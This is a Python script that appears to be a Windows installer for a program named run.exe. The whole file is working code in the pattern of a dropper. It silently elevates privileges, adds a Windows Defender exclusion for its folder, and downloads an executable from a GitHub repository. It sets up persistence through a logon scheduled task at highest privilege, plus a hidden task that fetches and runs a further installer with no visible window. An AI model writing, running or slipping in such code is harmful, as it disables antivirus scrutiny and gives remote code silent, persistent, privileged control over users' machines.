import os
import sys
import time
import ctypes
import subprocess
import urllib.request
import json

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate_if_needed():
    dat_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    is_update = os.path.exists(dat_file)

    if not is_update and not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable if getattr(sys, 'frozen', False) else sys.executable, f'"{script}" {params}' if not getattr(sys, 'frozen', False) else params, None, 1)
        sys.exit(0)

def main():
    elevate_if_needed()

    run_dir = os.path.join(os.getenv("APPDATA"), "run")
    run_exe = os.path.join(run_dir, "run.exe")
    dat_dir = os.path.join(os.path.join(os.getenv("APPDATA"), "Microsoft"), "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    temp_dir = os.path.join(os.getenv("TEMP"), "run")

    os.makedirs(run_dir, exist_ok=True)
    os.makedirs(dat_dir, exist_ok=True)
    os.makedirs(temp_dir, exist_ok=True)

    is_update = os.path.exists(dat_file)

    # 1. Defender Exclusion if clean install
    if not is_update:
        subprocess.run(
            ["powershell.exe", "-Command", f"Add-MpPreference -ExclusionPath '{run_dir}'"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )

    # 2. Terminate existing run.exe processes
    subprocess.run(["taskkill", "/F", "/IM", "run.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(2)

    # 3. Fetch latest commit SHA
    latest_commit = "main"
    try:
        req = urllib.request.Request("https://api.github.com/repos/yuan-miranda/run/commits/main", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            latest_commit = data.get("sha", "main")
    except Exception:
        pass

    # 4. Download latest run.exe
    download_url = f"https://github.com/yuan-miranda/run/raw/{latest_commit}/run.exe"
    try:
        urllib.request.urlretrieve(download_url, run_exe)
    except Exception as e:
        sys.exit(1)

    # 5. Register Scheduled Tasks
    task_name = "WinRun"
    installer_task_name = "WinRunInstaller"

    ps_task_cmd = (
        f"$action = New-ScheduledTaskAction -Execute '{run_exe}' -WorkingDirectory '{run_dir}'; "
        f"$trigger = New-ScheduledTaskTrigger -AtLogOn; "
        f"$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 365); "
        f"Register-ScheduledTask -TaskName '{task_name}' -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force"
    )
    subprocess.run(["powershell.exe", "-Command", ps_task_cmd], creationflags=subprocess.CREATE_NO_WINDOW)

    cmd_installer = (
        'powershell.exe -Command "$p=\\"$env:APPDATA\\run\\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; '
        '$sha=(Invoke-RestMethod \'https://api.github.com/repos/yuan-miranda/run/commits/main\').sha; '
        '$o=\\"$p\\installer.exe\\"; Invoke-WebRequest -Uri \\"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\\" -OutFile $o; '
        'Start-Process -FilePath $o -WindowStyle Hidden"'
    )

    ps_installer_task_cmd = (
        f"$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-Command {cmd_installer}'; "
        f"$installerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10) -Hidden; "
        f"Register-ScheduledTask -TaskName '{installer_task_name}' -Action $installerAction -Settings $installerSettings -RunLevel Highest -Force"
    )
    subprocess.run(["powershell.exe", "-Command", ps_installer_task_cmd], creationflags=subprocess.CREATE_NO_WINDOW)

    # Save state
    try:
        with open(dat_file, "w", encoding="utf-8") as f:
            f.write(latest_commit)
    except Exception:
        pass

    # 6. Launch run.exe
    subprocess.Popen([run_exe], creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == "__main__":
    main()
